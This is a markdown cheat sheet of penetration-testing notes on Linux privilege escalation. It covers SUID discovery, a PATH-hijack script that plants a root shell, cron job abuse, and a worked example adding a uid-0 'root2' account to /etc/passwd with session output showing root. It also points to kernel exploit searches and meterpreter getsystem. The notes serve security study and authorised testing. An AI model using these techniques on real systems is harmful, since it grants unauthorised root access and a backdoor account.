# Linux Privilege Escalation

- <https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>
- <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md>
- <https://book.hacktricks.xyz/linux-hardening/privilege-escalation>



`su - root`




`sudo -l`
list the privileges for the invoking user (or the user specified by the -U option)

`find / -type f -perm -u=s 2>/dev/null`
The SUID bit is a special permission in Unix/Linux systems that allows a file to be executed with the permissions of the file's owner rather than the user who executed the file.


`bash -p`
The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.




- Path injection or relative path exploit
```bash
# If there is an unknown SUID invoking another binary 
# that does not use absolute path
# And you can manipulate the PATH variable
# Create that binary like
echo "#!/bin/bash" > /tmp/THAT_BINARY
echo "/bin/bash -ip" >> /tmp/THAT_BINARY
export PATH=/tmp:$PATH
# Execute the suid binary and you will get root
```








## Exploiting Misconfigured Cron Jobs

```
# show cronjob set for current user
crontab -l

# identify wheter a not privileged user string is in any script
cd /
grep -rnw /usr -r "/home/[NOT PRIVELIGED USER]/[ROOT OWNED BIN]"
```


Linux implements task scheduling through a utility called Cron.

Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specified schedule.

An application, or script that has been configured to be run repeatedly with `cron` is known as a "cron job".

`cron` can be used to automate or repeat a wide variety of functions on a system, from daily backups to system upgrades and patches.

The crontab file is a configuration file that is used by the Cron utility to store and track Cron jobs that have been created.



Cron jobs can also be run as any user on the system, this is a very important factor to keep an eye on as we will be targeting Cron jobs that have been configured to be run as the `root` user.

This is primarily because, any script or command that is run by a Cron job will run as the root user and will consequently provide us with root access.

System-level scheduled jobs are executed with root user privileges and system administrators often create scripts for cron jobs with insecure permissions.

In order to elevate our privileges, we will need to find and identify cron jobs scheduled by the root user or the files being processed by the cron job.



















## Linux Password Hashes

Linux has multi-user support and as a result, multiple users can access the system simultaneously. This can be seen as both an advantage and disadvantage from a security perspective, in that, multiple accounts offer multiple access vectors for attackers and therefore increase the overall risk of the server.

All of the information for all accounts on Linux is stored in the passwd file located in: `/etc/passwd`

We cannot view the passwords for the users in the passwd file because they are encrypted and the passwd file is readable by any user on the system.

All the encrypted passwords for the users are stored in the shadow file. it can be found in the following directory: `/etc/shadow`

The shadow file can only be accessed and read by the root account, this is a very important security feature as it prevents other accounts on the system from accessing the hashed passwords.



The `passwd` file gives us information in regards to the hashing algorithm that is being used and the password hash, this is very helpful as we are able to determine the type of hashing algorithm that is being used and its strength. We can determine this by looking at the number after the username encapsulated by the dollar symbol ($).

Value	Hashing Algorithm
$1		MD5
$2		Blowfish
$5		SHA-256
$6		SHA-512








For backwards compatibility, if a password hash is present in the second column of an `/etc/passwd` user record, it is considered valid for authentication and it takes precedence over the respective entry in `/etc/shadow`, if available. This means that if we can write into `/etc/passwd`, we can effectively set an arbitrary password for any account.



Example:
Add another superuser (root2) and the corresponding password hash to `/etc/passwd`. 
We will first generate the password hash using the `openssl` tool and the `passwd` argument.
By default, if no other option is specified, `openssl` will generate a hash using the `crypt` algorithm, a supported hashing mechanism for Linux authentication. The output of the OpenSSL `passwd` command may vary depending on the system executing it. On older systems, it may default to the DES algorithm, while on some newer systems it could output the password in MD5 format.

```
joe@debian-privesc:~$ openssl passwd w00t
Fdzt.eqJQ4s0g

joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

joe@debian-privesc:~$ su root2
Password: w00t

root@debian-privesc:/home/joe# id
uid=0(root) gid=0(root) groups=0(root)
```
















## Exploiting SUID Binaries





This is the functionality that we will be attempting to exploit in order to elevate our privileges, however, the success of our attack will depend on the following factors:

- Owner of the SUID binary – Given that we are attempting to elevate our privileges, we will only be exploiting SUID binaries that are owned by the `root` user or other privileged users.

- Access permissions – We will require executable permissions in order to execute the SUID binary.







## Linux Capabilities

Capabilities are extra attributes that can be applied to processes, binaries, and services to assign specific privileges normally reserved for administrative operations, such as traffic capturing or adding kernel modules. Similarly to setuid binaries, if misconfigured, these capabilities could allow an attacker to elevate their privileges to root.









## Linux Kernel Exploitation

Kernel exploits on Linux will typically target vulnerabilities In the Linux kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell.

This process will differ based on the Kernel version and distribution being targeted and the kernel exploit being used.

Privilege escalation on Linux systems will typically follow the following methodology:
- Identifying kernel vulnerabilities
- Downloading, compiling and transferring kernel exploits onto the target system.


Linux-Exploit-Suggester - This tool is designed to assist in detecting security deficiencies for given Linux kernel/Linux-based machine. It assesses (using heuristics methods) the exposure of the given kernel on every publicly known Linux kernel exploit.
- GitHub: https://github.com/mzet-/linux-exploit-suggester







Example:
```
joe@ubuntu-privesc:~$ cat /etc/issue
Ubuntu 16.04.4 LTS \n \l

joe@ubuntu-privesc:~$ uname -r 
4.4.0-116-generic

joe@ubuntu-privesc:~$ arch 
x86_64


searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
```

























## MSF

```
meterpreter > getpriv
meterpreter > getsystem

```


/post/multi/recon/local_exploit_suggester


